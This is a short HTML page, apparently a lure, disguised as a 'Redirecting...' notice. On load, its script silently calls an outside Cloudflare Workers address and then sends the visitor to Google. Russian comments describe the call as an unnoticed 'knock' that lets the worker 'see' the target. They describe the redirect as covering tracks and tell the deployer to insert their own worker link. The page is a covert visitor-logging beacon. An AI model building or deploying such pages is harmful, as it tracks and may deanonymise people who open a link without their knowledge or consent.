<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <script>
        // Сначала "стучим" в воркер
        // Сначала незаметно запрашиваем твой воркер
        // ЗАМЕНИ ТУТ ССЫЛКУ НА СВОЮ ИЗ CLOUDFLARE!
        fetch("https://adminfdm.alexgranny1708.workers.dev/")
            .then(() => {
                // Как только воркер ответил, кидаем в Google
                // Как только воркер «увидел» цель, кидаем её в Google
                window.location.href = "https://google.com";
            })
            .catch(() => {
                // Если воркер заблокирован, все равно кидаем в Google через 1 сек
                setTimeout(() => {
                    window.location.href = "https://google.com";
                }, 1000);
                // Если что-то пошло не так, все равно уводим хвосты в Google
                window.location.href = "https://google.com";
            });
    </script>
</head>
<body>
    <h1>Redirecting...</h1>
    <p>Loading...</p>
</body>
</html>
